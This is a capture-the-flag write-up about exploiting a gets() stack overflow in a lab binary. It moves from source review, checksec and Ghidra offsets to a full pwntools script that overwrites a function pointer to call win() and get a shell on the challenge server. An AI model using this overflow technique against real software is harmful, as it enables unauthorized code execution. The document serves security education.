# Reconnaissance
## C Review
First we look into the provided c file. At a glance, the `main` function seems to be secure with the `fgets()` function properly limiting input to avoid overwriting the `sample` buffer. But the bottom of main calls `vuln()` function, which sounds interesting.

`vuln()` has a 50 byte buffer which it writes with `gets`, which means this is our attack vector. We will be overflowing the buffer to change the volatile int (pointer) and call another function--`win` since it spawns a shell!
## Binary Analysis
First, lets check how the ELF runs with the `checksec` command:
>$checksec ./challenge/chall_2

>Arch:     amd64-64-little  
>RELRO:    Partial RELRO  
>Stack:    No canary found  
>NX:       NX enabled  
>PIE:      No PIE (0x400000)

Notably, stack canary and PIE are disabled which should make our job much easier. Especially the lack of PIE, because we should be able to reliably know the address of the `win()` function. We also note that the architecture is 64-bit, which means that our address to the `win()` function will need to be 64-bit (8 bytes).

Next, lets decompile the executable file we were given with Ghidra to get an idea of what the stack looks like in the `vuln()` function. 
![Ghidra Vuln Function Image](writeUpFiles/ghidra1.png)  
It looks like despite the C file containing two buffers (`buf0` and `buf1`) only one is present here. Additionally, by looking at the positions of the two variables `local_10` and `local_48` on the stack, we see that `local_48` takes up 0x38 bytes (0x48-0x10) which amounts to a 56 byte buffer. Then, `local_10` is our pointer `volatile int (*ptr)()`, which we can tell because it is called later in the function.

# Script
To start testing, we are going to run our script on the ELF we were given for the challenge. We can load it like this:
```{python}
from pwn import *

EXE = ELF("./challenge/chall_4")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

win_address = EXE.symbols['win']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13374)
	return r
```
Here we are doing a couple of things. We are importing the `pwn` library to use as our primary tool for both working on the local file and the challenge server. Then, we use `pwn`'s `ELF` module to put the executable into a variable `EXE`. Then we set up a few things for `pwn`, most importantly `context.log_level = "DEBUG"` because this will give us verbose information about what we send and recieve with `pwn`. Finally, we use one of `pwn`'s features to find the address of the `win()` function. This should give the same value as what we found in Ghidra.  

The `conn()` function being set up here simply allows us to minimally change the program to run remotely when we are finished with testing. Calling this function with `True` as a parameter connects to the local installation of the server executable, whose path is written in the definition of the `EXE` variable. Then once our testing is completed, we can call `conn(False)` to make a connection to the remote server.

Next, we connect to the executable and run our package:
```{python}
io = conn(True)
# Wait for the process to send "Buy it, use it, break it, fix it..." and respond to move onto vuln()
io.recvline()
io.send(b'a\n')

# Create a payload with an offset of 54 bytes then the address win(), send it, and open an 
# interactive terminal -- The system is 64 bit so we need a 64 bit pointer to the address of win()
payload = b'a'*56
payload += p64(win_address)+b'\n'
io.send(payload)
io.interactive()

io.close()
```
If this spawns a terminal, then our code worked! We can run it again on the server then call `ls` and `cat flag.txt` in the interactive shell!